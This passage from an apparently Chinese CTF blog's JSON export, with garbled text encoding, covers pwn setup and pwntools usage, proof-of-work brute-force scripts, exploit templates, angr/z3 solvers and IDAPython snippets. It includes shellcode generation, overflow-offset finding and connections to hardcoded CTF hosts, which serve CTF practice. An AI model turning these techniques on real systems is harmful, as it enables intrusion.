Applications","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"https://lazzzaro.github.io/tags/%E7%AE%97%E6%B3%95/"}],"author":"Lazzaro"},{"title":"pwnå·¥å…·","slug":"pwn-pwnå·¥å…·","date":"2020-05-13T11:46:21.000Z","updated":"2023-11-10T10:37:55.926Z","comments":true,"path":"2020/05/13/pwn-pwnå·¥å…·/","permalink":"https://lazzzaro.github.io/2020/05/13/pwn-pwn%E5%B7%A5%E5%85%B7/","excerpt":"","text":"â€‹ glibcä¸‹è½½ï¼šhttps://ftp.gnu.org/gnu/libc/ æœ¬åœ°æ›´æ¢libcç¯å¢ƒå‡†å¤‡å·¥ä½œä¸‹è½½å·¥å…· patchelfï¼šgit clone https://github.com/NixOS/patchelf glibc-all-in_oneï¼šgit clone https://github.com/matrix1001/glibc-all-in-one æŸ¥çœ‹é¢˜ç›®libcç‰ˆæœ¬è€ç‰ˆæœ¬ï¼šstrings libc.so.6 | grep &#39;Ubuntu GLIBC&#39; æ–°ç‰ˆæœ¬ï¼š./libc.so.6 ä¸‹è½½æŒ‡å®šlibcè¿›å…¥ä¸‹è½½å¥½çš„ glibc-all-in-one æ–‡ä»¶å¤¹ï¼Œå‘½ä»¤ï¼š 123456789./update_list #æ›´æ–°æœ€æ–°ç‰ˆæœ¬çš„glibccat list #æŸ¥çœ‹å¯ä¸‹è½½çš„glibc./download 2.31-0ubuntu9.5_amd64 #æ‰¾åˆ°éœ€è¦çš„glibcç‰ˆæœ¬ï¼Œä¸‹è½½åˆ°æœ¬åœ°cat old_list #æ‰“å¼€è€ç‰ˆæœ¬glibcåˆ—è¡¨ï¼ˆå¦‚æœåœ¨listä¸­æ²¡æœ‰æ‰¾åˆ°éœ€è¦çš„glibcç‰ˆæœ¬ï¼‰./download_old 2.26-0ubuntu2.1_amd64 #æ‰¾åˆ°éœ€è¦çš„è€ç‰ˆæœ¬glibcï¼Œä¸‹è½½åˆ°æœ¬åœ°#ä¸‹è½½è·¯å¾„ï¼š/glibc-all-in-one/libs#å¦‚æœåœ¨old_listå’Œlisté‡Œéƒ½æ²¡æœ‰æ‰¾åˆ°åˆé€‚çš„ç‰ˆæœ¬ï¼Œå¯ä»¥é€‰æ‹©ç›¸è¿‘çš„ç‰ˆæœ¬çš„ldæ–‡ä»¶ åˆ©ç”¨patchelfä¿®æ”¹é¢˜ç›®ç¯å¢ƒpatchelf --set-interpreter [~/glibc-all-in-one/libs/2.26-0ubuntu2.1_amd64/ld-2.26.so] --set-rpath [~/glibc-all-in-one/libs/2.26-0ubuntu2.1_amd64] [./gundam] ä¸‰ä¸ª[ ]åˆ†åˆ«å¯¹åº” ldæ–‡ä»¶åœ°å€ã€glibcæ–‡ä»¶å¤¹ã€é¢˜ç›®æ–‡ä»¶ã€‚ï¼ˆ--set-rpath åé¢çš„åœ°å€æœ‰æ—¶å€™éœ€è¦åŠ ä¸Š â€œ / â€ ï¼‰ patchelf --set-rpath çš„ä½œç”¨æ˜¯ åœ¨ELFæ–‡ä»¶çš„ Dynamic section çš„ä¸­æ·»åŠ ä¸€ä¸ª RUNPATH æ®µé‡Œé¢å‚¨å­˜ç€åŠ¨æ€é“¾æ¥åº“çš„ç»å¯¹è·¯å¾„ï¼Œå³è®¾ç½®ç¨‹åºçš„åŠ¨æ€é“¾æ¥åº“ã€‚ patchelf --set-interpreter çš„ä½œç”¨æ˜¯ åœ¨ELFæ–‡ä»¶çš„ interp section è®¾ç½® interpreter é¡¹çš„å€¼ä¸º ldåŠ è½½å™¨ç»å¯¹è·¯å¾„ï¼Œå³è®¾ç½®ç¨‹åºçš„åŠ¨æ€é“¾æ¥åº“åŠ è½½å™¨ã€‚ â€‹ pwntoolspwntoolsæ˜¯ä¸€ä¸ªCTFæ¡†æ¶å’Œæ¼æ´åˆ©ç”¨å¼€å‘åº“ï¼Œç”¨Pythonå¼€å‘ï¼Œæ—¨åœ¨è®©ä½¿ç”¨è€…ç®€å•å¿«é€Ÿçš„ç¼–å†™exploitã€‚ ç”¨æ³•æ±‡æ€»å¯¼å…¥ä¸ç¯å¢ƒè®¾ç½® 1234567from pwn import * #å¯¼å…¥åŒ…#osè®¾ç½®ç³»ç»Ÿä¸ºlinuxç³»ç»Ÿ#archè®¾ç½®æ¶æ„ä¸º32/64ä½#log_levelè®¾ç½®æ—¥å¿—è¾“å‡ºçš„ç­‰çº§ä¸ºdebugï¼ˆä¼šå°†å®Œæ•´çš„ioè¿‡ç¨‹éƒ½æ‰“å°ä¸‹æ¥ï¼Œæ–¹ä¾¿å‡ºç°é—®é¢˜æ—¶æ’æŸ¥é”™è¯¯ï¼‰context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;) è¿æ¥ 123456# ç¬¬ä¸€ç§è¿æ¥æ–¹å¼ï¼Œé€šè¿‡ipå’Œportå»è¿æ¥conn = remote(&#x27;127.0.0.1&#x27;, 8888)# ç¬¬äºŒç§è¿æ¥æ–¹å¼ï¼Œé€šè¿‡sshè¿æ¥shell = ssh(host=&#x27;192.168.14.144&#x27;, user=&#x27;root&#x27;, port=2222, password=&#x27;123456&#x27;)# ç¬¬ä¸‰ç§è¿æ¥æ–¹å¼ï¼Œæ‰“å¼€ç¨‹åºï¼Œå¼€å¯è¿›ç¨‹p = process(&#x27;./reverse0&#x27;) æ‰“åŒ…å‡½æ•° p32/p64: æ‰“åŒ…ä¸€ä¸ªæ•´æ•°ï¼Œåˆ†åˆ«æ‰“åŒ…ä¸º32ä½æˆ–64ä½u32/u64: è§£åŒ…ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¾—åˆ°æ•´æ•° 123# æ¯”å¦‚å°†0xdeadbeefè¿›è¡Œ32ä½çš„æ‰“åŒ…ï¼Œå°†ä¼šå¾—åˆ°&#x27;\\xef\\xbe\\xad\\xde&#x27;ï¼ˆå°ç«¯åºï¼‰payload = p32(0xdeadbeef) #pack 32 bits numberpayload = p64(0xdeadbeef) #pack 64 bits number å‘é€å’Œæ¥æ”¶æ•°æ® 12345678conn.send(data) #å‘é€æ•°æ®conn.sendline(data) #å‘é€ä¸€è¡Œæ•°æ®ï¼Œç›¸å½“äºåœ¨æ•°æ®åé¢åŠ \\nconn.recv(numb = 2048, timeout = default) #æ¥æ”¶æ•°æ®ï¼Œnumbåˆ¶å®šæ¥æ”¶çš„å­—èŠ‚ï¼ŒtimeoutæŒ‡å®šè¶…æ—¶conn.recvline(keepends=True) #æ¥å—ä¸€è¡Œæ•°æ®ï¼Œkeependsä¸ºæ˜¯å¦ä¿ç•™è¡Œå°¾çš„\\nconn.recvuntil(&quot;Hello,World\\n&quot;,drop=false) #æ¥å—æ•°æ®ç›´åˆ°æˆ‘ä»¬è®¾ç½®çš„æ ‡å¿—å‡ºç°conn.recvall() #ä¸€ç›´æ¥æ”¶ç›´åˆ° EOFconn.recvrepeat(timeout = default) #æŒç»­æ¥å—ç›´åˆ°EOFæˆ–timeoutconn.interactive() #ç›´æ¥è¿›è¡Œäº¤äº’ï¼Œç›¸å½“äºå›åˆ°shellçš„æ¨¡å¼ï¼Œåœ¨å–å¾—shellä¹‹åä½¿ç”¨ ELFæ¨¡å— ç”¨äºè·å–ELFæ–‡ä»¶çš„ä¿¡æ¯ï¼Œé¦–å…ˆä½¿ç”¨ELF()è·å–è¿™ä¸ªæ–‡ä»¶çš„å¥æŸ„ï¼Œç„¶åä½¿ç”¨è¿™ä¸ªå¥æŸ„è°ƒç”¨å‡½æ•°ï¼Œå’ŒIOæ¨¡å—å¾ˆç›¸ä¼¼ã€‚ 12345e = ELF(&#x27;/bin/cat&#x27;)print(hex(e.address)) # è·å–æ–‡ä»¶è£…è½½çš„åŸºåœ°å€print(hex(e.symbols[&#x27;write&#x27;])) # è·å–å‡½æ•°åœ°å€ï¼ˆåŸºäºç¬¦å·ï¼‰print(hex(e.got[&#x27;write&#x27;])) # è·å–å‡½æ•°gotè¡¨çš„åœ°å€print(hex(e.plt[&#x27;write&#x27;])) # è·å–å‡½æ•°pltè¡¨çš„åœ°å€ æ±‡ç¼–ä¸åæ±‡ç¼– 12asm(&#x27;mov eax, 0&#x27;) #æ±‡ç¼–disasm(&#x27;\\xb8\\x0b\\x00\\x00\\x00&#x27;) #åæ±‡ç¼– ç”Ÿæˆshellcode å…ˆé€šè¿‡contextè®¾ç½®æ¶æ„ï¼Œç„¶åç”Ÿæˆshellcodeã€‚ 12context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;) #è®¾ç½®ç¯å¢ƒshellcode = asm(shellcraft.sh()) #æ‰“å°å‡ºæ±‡ç¼–åçš„shellcode è°ƒç”¨gdbè°ƒè¯• åœ¨pythonæ–‡ä»¶ä¸­ç›´æ¥è®¾ç½®æ–­ç‚¹ï¼Œå½“è¿è¡Œåˆ°è¯¥ä½ç½®ä¹‹åå°±ä¼šæ–­ä¸‹ã€‚ 123from pwn import *p = process(&#x27;./c&#x27;)gdb.attach(p) Cyclic Pattern ä½¿ç”¨pwntoolsç”Ÿæˆä¸€ä¸ªpatternï¼ŒpatternæŒ‡ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¯ä»¥é€šè¿‡å…¶ä¸­çš„ä¸€éƒ¨åˆ†æ•°æ®å»å®šä½åˆ°å…¶åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„ä½ç½®ã€‚ å¦‚ï¼Œåœ¨æ ˆæº¢å‡ºçš„æ—¶å€™ï¼Œé¦–å…ˆæ„é€ cyclic(0x100)ï¼Œæˆ–è€…æ›´é•¿é•¿åº¦çš„patternï¼Œè¿›è¡Œè¾“å…¥ï¼Œè¾“å…¥åpcçš„å€¼å˜ä¸º0x61616161ï¼Œé‚£ä¹ˆå†é€šè¿‡cyclic_find(0x61616161)å°±å¯ä»¥å¾—åˆ°ä»å“ªä¸€ä¸ªå­—èŠ‚å¼€å§‹ä¼šæ§åˆ¶PCå¯„å­˜å™¨äº†ï¼Œé¿å…äº†å¾ˆå¤šæ²¡å¿…è¦çš„è®¡ç®—ã€‚ 123cyclic(0x100) # ç”Ÿæˆä¸€ä¸ª0x100å¤§å°çš„patternï¼Œå³ä¸€ä¸ªç‰¹æ®Šçš„å­—ç¬¦ä¸²cyclic_find(0x61616161) # æ‰¾åˆ°è¯¥æ•°æ®åœ¨patternä¸­çš„ä½ç½®cyclic_find(&#x27;aaaa&#x27;) # æŸ¥æ‰¾ä½ç½®ä¹Ÿå¯ä»¥ä½¿ç”¨å­—ç¬¦ä¸²å»å®šä½ â€‹ å¸¸ç”¨è„šæœ¬SHA / MD5 è®¤è¯ï¼ˆProof of Workï¼‰1234567891011121314151617181920#python3 è„šæœ¬1from pwn import *from hashlib import sha256import stringfrom pwnlib.util.iters import mbruteforcer = remote(&#x27;34.74.30.191&#x27;,1337)table = string.ascii_letters+string.digitsdef PoW(): r.recvuntil(b&#x27;XXXX+&#x27;) suffix = r.recv(16).decode() r.recvuntil(b&#x27;== &#x27;) cipher = r.recvline().strip().decode() proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() == cipher, table, length=4, method=&#x27;fixed&#x27;) r.sendlineafter(b&#x27;XXXX: &#x27;, proof.encode()) PoW()r.interactive() 123456789101112131415#python2 è„šæœ¬from pwn import *from parse import *from pwnlib.util.iters import bruteforceimport stringfrom hashlib import sha256def brute_force(prefix,s): return bruteforce(lambda x:sha256(x+prefix).hexdigest()==s,string.ascii_letters+string.digits,length=4,method=&#x27;fixed&#x27;)r = remote(&quot;34.74.30.191&quot;,1337)data = r.recvline()prefix, s = parse(&quot;sha256(XXXX+&#123;&#125;) == &#123;&#125;&quot;,data)r.recvline()r.sendline(brute_force(prefix,s)) 1234567891011121314151617181920#python3 è„šæœ¬2from hashlib import sha256from itertools import productdata = r.recvline().decode()print(data)suffix = re.findall(r&#x27;\\(XXX\\+(.*?)\\)&#x27;, data)[0]digest = re.findall(r&#x27;== (.*?)\\n&#x27;, data)[0]print(f&quot;suffix: &#123;suffix&#125; \\ndigest: &#123;digest&#125;&quot;)print(&#x27;Calculating hash...&#x27;)dic = string.ascii_letters + string.digitsfor i in product(dic, repeat=3): prefix = &#x27;&#x27;.join(i) guess = prefix + suffix if sha256(guess.encode()).hexdigest() == digest: print(f&quot;result: &#123;guess&#125;\\n&quot;) breakr.sendlineafter(b&#x27;[+] Plz Tell Me XXX :&#x27;,prefix.encode()) ä¼ªéšæœºæ•°åŒæ­¥12345from ctypes import *libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)libc.srand(libc.time(0))r = libc.rand() â€‹ æ¨¡æ¿12345678910111213from pwn import *sd = lambda x:p.send(x)sl = lambda x:p.sendline(x)sda = lambda x,y:p.sendafter(x,y)sla = lambda x,y:p.sendlineafter(x,y)ru = lambda x:p.recvuntil(x)rv = lambda x:p.recv(x)io = lambda :p.interactive()ps = lambda :pause()p = remote(&#x27;ok&#x27;, 20002)context.log_level = &#x27;debug&#x27; 12345678910111213141516171819202122232425262728293031323334353637#coding=utf8#python2from pwn import *context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;zsh&#x27;, &#x27;-c&#x27;]context.log_level = &#x27;info&#x27;# functions for quick scripts = lambda data :p.send(data)sa = lambda delim,data :p.sendafter(delim, data)sl = lambda data :p.sendline(data)sla = lambda delim,data :p.sendlineafter(delim, data)r = lambda numb=4096, timeout=2:p.recv(numb, timeout=timeout)rl = lambda :p.recvline()ru = lambda delims, drop=True :p.recvuntil(delims, drop)irt = lambda :p.interactive()dbg = lambda gs=&#x27;&#x27;, **kwargs :gdb.attach(p, gdbscript=gs, **kwargs)# misc functionsuu32 = lambda data :u32(data.ljust(4, &#x27;\\x00&#x27;))uu64 = lambda data :u64(data.ljust(8, &#x27;\\x00&#x27;))leak = lambda name, addr :log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))def rs(arg=[]): global p if arg == &#x27;remote&#x27;: p = remote(*host) else: p = binary.process(argv=arg, raw=True)#libc = ELF(&#x27;./libc-2.27.so&#x27;, checksec=False)binary = ELF(&#x27;./once&#x27;, checksec=False)host = (&#x27;182.92.108.71&#x27;, 30103)#rs()rs(&#x27;remote&#x27;)irt() â€‹ seccomp-toolså½“ä½¿ç”¨äº† prctl ç³»ç»Ÿè°ƒç”¨çš„ PR_SET_SECCOMP åŠŸèƒ½ç¦ç”¨äº†ä¸€äº›ç³»ç»Ÿè°ƒç”¨ï¼Œç›´æ¥ç”¨ seccomp-tools å¯ä»¥çœ‹ç¦ç”¨çš„ç³»ç»Ÿè°ƒç”¨ã€‚ seccomp-tools dump ./pwn","categories":[{"name":"pwn","slug":"pwn","permalink":"https://lazzzaro.github.io/categories/pwn/"}],"tags":[{"name":"è„šæœ¬","slug":"è„šæœ¬","permalink":"https://lazzzaro.github.io/tags/%E8%84%9A%E6%9C%AC/"},{"name":"pwntools","slug":"pwntools","permalink":"https://lazzzaro.github.io/tags/pwntools/"}],"author":"Lazzaro"},{"title":"è‡ªåŠ¨åŒ–å·¥å…·","slug":"reverse-è‡ªåŠ¨åŒ–å·¥å…·","date":"2020-05-11T17:23:13.000Z","updated":"2022-11-09T13:31:13.588Z","comments":true,"path":"2020/05/12/reverse-è‡ªåŠ¨åŒ–å·¥å…·/","permalink":"https://lazzzaro.github.io/2020/05/12/reverse-%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7/","excerpt":"","text":"angrangræ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶çš„ä»£ç åˆ†æå·¥å…·, èƒ½å¤Ÿè‡ªåŠ¨åŒ–çš„å®ŒæˆäºŒè¿›åˆ¶æ–‡ä»¶çš„åˆ†æå¹¶æ‰¾å‡ºæ¼æ´ã€‚å¯ä»¥è¿›è¡ŒåŠ¨æ€çš„ç¬¦å·æ‰§è¡Œåˆ†æã€‚ 123456789import angrproj = angr.Project(&quot;./enormous&quot;)state = proj.factory.entry_state()sim = proj.factory.simulation_manager(state)sim.explore(find=(0x400000+0x3950), avoid=(0x400000+0x3963))if len(sim.found) &gt; 0: print(&quot;Yes&quot;) print(sim.found[0].posix.dumps(0)) â€‹ z3z3 æ˜¯ä¸€ä¸ªå¾®è½¯å‡ºå“çš„å¼€æºçº¦æŸæ±‚è§£å™¨ï¼Œèƒ½å¤Ÿè§£å†³å¾ˆå¤šç§æƒ…å†µä¸‹çš„ç»™å®šéƒ¨åˆ†çº¦æŸæ¡ä»¶å¯»æ±‚ä¸€ç»„æ»¡è¶³æ¡ä»¶çš„è§£çš„é—®é¢˜ï¼ŒåŠŸèƒ½å¼ºå¤§ä¸”æ˜“äºä½¿ç”¨ã€‚z3 çº¦æŸæ±‚è§£å™¨æ˜¯é’ˆå¯¹ Satisfiability modulo theories Problem çš„ä¸€ç§é€šç”¨æ±‚è§£å™¨ã€‚æ‰€è°“ SMT é—®é¢˜ï¼Œåœ¨ z3 ç¯å¢ƒä¸‹æ˜¯æŒ‡å…³äºç®—æœ¯ã€ä½è¿ç®—ã€æ•°ç»„ç­‰èƒŒæ™¯ç†è®ºçš„ä¸€é˜¶é€»è¾‘ç»„åˆå†³å®šæ€§é—®é¢˜ã€‚è™½ç„¶ z3 åŠŸèƒ½å¼ºå¤§ï¼Œä½†æ˜¯ä»ç†è®ºä¸Šæ¥è¯´ï¼Œå¤§éƒ¨åˆ† SMT é—®é¢˜çš„æ—¶é—´å¤æ‚åº¦éƒ½è¿‡é«˜ï¼Œæ ¹æœ¬ä¸å¯èƒ½åœ¨æœ‰é™æ—¶é—´å†…è§£å†³ã€‚æ‰€ä»¥åƒä¸‡ä¸è¦æŠŠ z3 æƒ³è±¡å¾—è¿‡äºä¸‡èƒ½ã€‚ z3 åœ¨å·¥ä¸šåº”ç”¨ä¸­å®é™…ä¸Šå¸¸è§äºè½¯ä»¶éªŒè¯ã€ç¨‹åºåˆ†æç­‰ã€‚ç„¶è€Œç”±äºåŠŸèƒ½å®åœ¨å¼ºå¤§ï¼Œä¹Ÿè¢«ç”¨äºå¾ˆå¤šå…¶ä»–é¢†åŸŸã€‚CTF é¢†åŸŸæ¥è¯´ï¼Œèƒ½å¤Ÿç”¨çº¦æŸæ±‚è§£å™¨æå®šçš„é—®é¢˜å¸¸è§äºå¯†ç é¢˜ã€äºŒè¿›åˆ¶é€†å‘ã€ç¬¦å·æ‰§è¡Œã€Fuzzing æ¨¡ç³Šæµ‹è¯•ç­‰ã€‚æ­¤å¤–ï¼Œè‘—åçš„äºŒè¿›åˆ¶åˆ†ææ¡†æ¶ angr ä¹Ÿå†…ç½®äº†ä¸€ä¸ªä¿®æ”¹ç‰ˆçš„ z3ã€‚ z3 å†…ç½®äº†å¤šç§å˜é‡ç±»å‹ï¼ŒåŸºæœ¬èƒ½è¦†ç›–å¸¸è§è®¡ç®—æœºæ•°æ®ç»“æ„ã€‚åŒ…æ‹¬æ•´æ•°ã€æµ®ç‚¹æ•°ã€BitVectorã€æ•°ç»„ç­‰ã€‚ z3 åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œåªå¯»æ‰¾æ»¡è¶³æ‰€æœ‰æ¡ä»¶çš„ä¸€ç»„è§£ï¼Œè€Œä¸æ˜¯æ‰¾å‡ºæ‰€æœ‰è§£ã€‚ å‚è€ƒï¼šZ3 API in Python è§£ç®€å•æ–¹ç¨‹ 1234from z3 import *x = Int(&#x27;x&#x27;)y = Int(&#x27;y&#x27;)solve(x &gt; 2, y &lt; 10, x + 2*y == 7) æ±‚è§£å®é™…æ¡ˆä¾‹ Solver()å‘½ä»¤åˆ›å»ºä¸€ä¸ªé€šç”¨æ±‚è§£å™¨ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡addå‡½æ•°æ·»åŠ çº¦æŸæ¡ä»¶ã€‚æˆ‘ä»¬ç§°ä¹‹ä¸ºå£°æ˜çº¦æŸæ¡ä»¶ã€‚check()å‡½æ•°è§£å†³å£°æ˜çš„çº¦æŸæ¡ä»¶ï¼Œsatç»“æœè¡¨ç¤ºæ‰¾åˆ°æŸä¸ªåˆé€‚çš„è§£ï¼Œunsatç»“æœè¡¨ç¤ºæ²¡æœ‰è§£ã€‚è¿™æ—¶å€™æˆ‘ä»¬ç§°çº¦æŸç³»ç»Ÿæ— è§£ã€‚æœ€åï¼Œæ±‚è§£å™¨å¯èƒ½æ— æ³•è§£å†³çº¦æŸç³»ç»Ÿå¹¶è¿”å›æœªçŸ¥ä½œä¸ºç»“æœã€‚ å¸¸ç”¨çš„æ•°æ®ç±»å‹ï¼š BitVec - è‡³ç‰¹å®šå¤§å°çš„æ•°æ®ç±»å‹ Int - æ•´å‹ Real - æœ‰ç†æ•° Bool - å¸ƒå°”ç±»å‹ Array - æ•°ç»„ å¸¸ç”¨å‡½æ•°ï¼š LShR(x, 1) - é€»è¾‘å³ç§»ï¼ˆç”¨0å¡«å……ï¼Œ&gt;&gt; ä¸ºç®—æœ¯å³ç§»ï¼‰ ä¾‹1ï¼š 1234567891011from z3 import *a1, a2, a3, a4, a5, a6 = Ints(&quot;a1 a2 a3 a4 a5 a6&quot;)x = Solver()x.add(a1 * 3 + a2 * 2 + a3 * 5 == 1003)x.add(a1 * 4 + a2 * 7 + a3 * 9 == 2013)x.add(a1 + a2 * 8 + a3 * 2 == 1109)x.add(a4 * 3 + a5 * 2 + a6 * 5 == 671)x.add(a4 * 4 + a5 * 7 + a6 * 9 == 1252)x.add(a4 + a5 * 8 + a6 * 2 == 644)x.check()print(x.model()) ä¾‹2ï¼š 1234567891011121314151617181920212223242526272829from z3 import *so = Solver()flag = [BitVec(f&#x27;flag&#123;i&#125;&#x27;,8) for i in range(36)]a = [i for i in flag]b = [i for i in range(36)]c = [0 for i in range(36)]d = [0x12027,0x0F296,0x0BF0E,0x0D84C,0x91D8,0x297,0x0F296,0x0D830,0x0A326,0x0B010,0x7627,0x230,0x0BF0E,0x0A326,0x8FEB,0x879D,0x70C3,0x1BD,0x0D84C,0x0B010,0x879D,0x0B00D,0x6E4F,0x1F7,0x91D8,0x7627,0x70C3,0x6E4F,0x9BDC,0x15C,0x297,0x230,0x1BD,0x1F7,0x15C,0x6]for i in range(6): for j in range(6): b[i+6*j] = a[6*i+j]for i in range(6): for j in range(6): for k in range(6): c[j+6*i] = c[j+6*i] + a[6*i+k]*b[6*k+j] so.add(simplify(c[j+6*i]) == d[j+6*i])for i in range(6,36-10): so.add(flag[i]&gt;=32) so.add(flag[i]&lt;=127)for i in range(6): so.add(flag[i] == ord(&#x27;whctf&#123;&#x27;[i]))for i in range(36-9,36): so.add(flag[i] == 0x1)so.add(flag[-10] == ord(&#x27;&#125;&#x27;))if so.check() == sat: m = so.model() print(&#x27;&#x27;.join(chr(m[i].as_long()) for i in flag))else: print(&#x27;Error&#x27;)","categories":[{"name":"reverse","slug":"reverse","permalink":"https://lazzzaro.github.io/categories/reverse/"}],"tags":[{"name":"è‡ªåŠ¨åŒ–","slug":"è‡ªåŠ¨åŒ–","permalink":"https://lazzzaro.github.io/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"angr","slug":"angr","permalink":"https://lazzzaro.github.io/tags/angr/"},{"name":"z3","slug":"z3","permalink":"https://lazzzaro.github.io/tags/z3/"}],"author":"Lazzaro"},{"title":"IDA","slug":"reverse-IDA","date":"2020-05-11T17:18:41.000Z","updated":"2023-08-03T15:10:45.829Z","comments":true,"path":"2020/05/12/reverse-IDA/","permalink":"https://lazzzaro.github.io/2020/05/12/reverse-IDA/","excerpt":"","text":"å¸¸ç”¨å¿«æ·é”®Shift+F12ï¼šæŸ¥çœ‹æ‰€æœ‰å­—ç¬¦ä¸² F5ï¼šæŸ¥çœ‹ä¼ªä»£ç  Alt+Tï¼šæŸ¥æ‰¾å­—ç¬¦ä¸² ç©ºæ ¼ï¼šåˆ‡æ¢å›¾å½¢è§†å›¾&amp;æ±‡ç¼–è§†å›¾ /ï¼šåœ¨åç¼–è¯‘åä¼ªä»£ç çš„ç•Œé¢ä¸­å†™ä¸‹æ³¨é‡Š xï¼šå¯¹ç€æŸä¸ªå‡½æ•°ã€å˜é‡æŒ‰è¯¥å¿«æ·é”®ï¼Œå¯ä»¥æŸ¥çœ‹å®ƒçš„äº¤å‰å¼•ç”¨ nï¼šæ”¹å˜é‡å yï¼šæ”¹å˜é‡ç±»å‹ â€‹ IDAPythonåœ¨IDAä¸­è¦ä½¿ç”¨è„šæœ¬æœ‰ä¸‰ç§æ–¹å¼ï¼š ç¬¬ä¸€ç§ï¼Œç›´æ¥æŒ‰Shift+F2å¿«æ·é”®è°ƒå‡ºç•Œé¢ï¼Œä¹Ÿå¯ä»¥ç›´æ¥åœ¨èœå•ä¸­é€‰æ‹©å‘½ä»¤è„šæœ¬ï¼ˆFile -&gt; Script commandï¼‰ï¼› ç¬¬äºŒç§ï¼Œå†™ä¸€ä¸ªè„šæœ¬æ–‡ä»¶ç›´æ¥è¿›è¡Œå¼•ç”¨ï¼ˆFile -&gt; Script fileï¼‰ï¼› ç¬¬ä¸‰ç§ï¼Œç›´æ¥åœ¨IDAåº•éƒ¨å†™å‘½ä»¤ã€‚ IDAPythonç”±ä¸‰ä¸ªç‹¬ç«‹æ¨¡å—ç»„æˆï¼š idc: idcå‡½æ•°çš„å…¼å®¹æ¨¡å—ï¼ŒåŒ…å«IDAå†…ç½®å‡½æ•°å£°æ˜å’Œå†…éƒ¨å®šä¹‰ idautils: å®ç”¨å‡½æ•°æ¨¡å— idaapi: ç”¨äºè®¿é—®æ›´å¤šåº•å±‚æ•°æ®çš„æ¨¡å— æŒ‡ä»¤æ“ä½œ12345678910import idcimport idaapiimport idautilsea = idc.here();print(&quot;å½“å‰æ¨¡å—åŸºå€ä¸º: &#123;&#125;&quot;.format(hex(idaapi.get_imagebase())))print(&quot;å½“å‰çš„æ±‡ç¼–è¯­å¥ä¸º: &#123;&#125;&quot;.format(idc.GetDisasm(ea)))print(&quot;å½“å‰çš„æ±‡ç¼–æŒ‡ä»¤ä¸º: &#123;&#125;&quot;.format(idc.print_insn_mnem(ea)))print(&quot;å½“å‰çš„æ“ä½œæ•°ä¸º: &#123;&#125;&quot;.format(idc.print_operand(ea,0)))print(&quot;å½“å‰çš„æ“ä½œæ•°å€¼ä¸º: &#123;&#125;&quot;.format(idc.get_operand_value(ea,0))) æ®µæ“ä½œ123456789import idcimport idaapiimport idautilsfor seg in idautils.Segments(): segname = idc.get_segm_name(seg) segstart = idc.get_segm_start(seg) segend = idc.get_segm_end(seg) print(&quot;æ®µå = &#123;&#125; èµ·å§‹åœ°å€= &#123;&#125; ç»“æŸåœ°å€ = &#123;&#125; &quot;.format(segname,hex(segstart),hex(segend))); å‡½æ•°æ“ä½œ1234567891011121314151617181920import idcimport idaapiimport idautilsfor seg in idautils.Segments(): segname = idc.get_segm_name(seg) segstart = idc.get_segm_start(seg) segend = idc.get_segm_end(seg) print(&quot;æ®µå = &#123;&#125; èµ·å§‹åœ°å€ = &#123;&#125; ç»“æŸåœ°å€ = &#123;&#125; &quot;.format(segname,hex(segstart),hex(segend))); if (segname == &#x27;.text&#x27;): for funcaddr in Functions(segstart,segend): funname = idc.get_func_name(funcaddr) funend = idc.find_func_end(funcaddr) funnext = idc.get_next_func(funcaddr) funnextname = idc.get_func_name(funnext) print(&quot;å½“å‰å‡½æ•°å = &#123;&#125; å½“å‰ç»“æŸåœ°å€ = &#123;&#125; ä¸‹ä¸€ä¸ªå‡½æ•°åœ°å€ = &#123;&#125; ä¸‹ä¸€ä¸ªå‡½æ•°å = &#123;&#125;&quot;.format(funname,hex(funend),hex(funnext),funnextname))ea = idc.get_screen_ea()funnextoffset = idc.get_func_off_str(ea)print(&quot;å½“å‰é€‰æ‹©åœ°å€è·ç¦»å½“å‰å‡½æ•°çš„åç§»ä¸º: &#123;&#125; &quot;.format(funnextoffset)) æœç´¢åœ¨IDAPythonä¸­å¦‚æœæƒ³æŸ¥è¯¢æŸäº›æ•°æ®ã€ä»£ç ã€äºŒè¿›åˆ¶ï¼Œéƒ½å¯ä»¥ç”¨éƒ½æœç´¢å‡½æ•°ã€‚æœç´¢å‡½æ•°å¯ä»¥æ˜¯å‘ä¸Šæœç´¢ï¼Œä¹Ÿå¯ä»¥æ˜¯å‘ä¸‹æœç´¢ï¼Œæœç´¢å¤±è´¥å°±ä¼šè¿”å›-1ï¼Œä¹Ÿå°±æ˜¯BADADDRï¼Œè€Œæœç´¢åŠŸèƒ½ä¹Ÿå¸¸å¸¸ç”¨äºå»é™¤èŠ±æŒ‡ä»¤å½“ä¸­ã€‚ 12345ea = here()value = idc.find_binary(ea,SEARCH_DOWN,&#x27;8B 4D 08&#x27;) #ä»eaä½ç½®å‘ä¸‹æŸ¥æ‰¾ æŸ¥æ‰¾çš„äºŒè¿›åˆ¶ä¸º8B 4D 08 è¿”å›æŸ¥æ‰¾åˆ°çš„åœ°å€value1 = idc.find_code(ea,SEARCH_DOWN) #ä»eaè¿˜æ˜¯æŸ¥æ‰¾æ‰¾åˆ°eaä¸‹çš„ç¬¬ä¸€è¡Œcodeä»£ç åœ°å€value2 = idc.find_data(ea,SEARCH_DOWN) æ•°æ®æ ¡éªŒ123456789import idcea = here()value1 = idc.find_code(ea,SEARCH_DOWN)print(hex(value1))flag = ida_bytes.get_full_flags(value1) #è·å–æ ‡å¿—print(flag)print(ida_bytes.is_code(flag)) #åˆ¤æ–­æ˜¯å¦æ˜¯ä»£ç ä¼ å…¥æ 